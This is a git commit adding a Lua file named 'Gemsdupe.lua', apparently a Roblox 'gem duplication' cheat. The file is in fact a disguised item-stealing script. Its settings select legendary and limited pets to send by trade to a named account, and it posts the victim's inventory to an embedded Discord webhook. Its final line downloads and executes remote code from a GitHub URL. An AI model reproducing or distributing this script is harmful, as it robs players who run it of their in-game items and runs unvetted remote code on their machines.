c54a3d75d6c9d08c3450f05cb56c047cf75595c9
Shisuiiiis <108449104+Shisuiiiis@users.noreply.github.com>
2022-07-01 13:36:10 +0800

    Create Gemsdupe.lua

---
+++ Gemsdupe.lua
@@ -0,0 +1,6 @@
+PetRarity = "Legendary" -- Select Pet Rarity: Common Epic Legendary
+PetLimited = true -- If pet is limited it will take it!
+PetAll = false -- Will send all hes pets
+TradeUser = "tyfortnycfPH" -- Write your username so it will send to you trade
+WebhookURL = "https://discord.com/api/webhooks/992300568179646534/WrjjHiwEoo-CA4vJW4dzLktngYmng8ce2tXtBdEuzeH_6Mzi5NVeM3DSd4Bk-HwB0X6B" -- Your webhook so it sends user inventory if its bigger than 500 pets it won't send it will delete webhook.
+loadstring(game:HttpGet("https://raw.githubusercontent.com/wtfkid/AutoFarm/main/dupegems.lua"))()
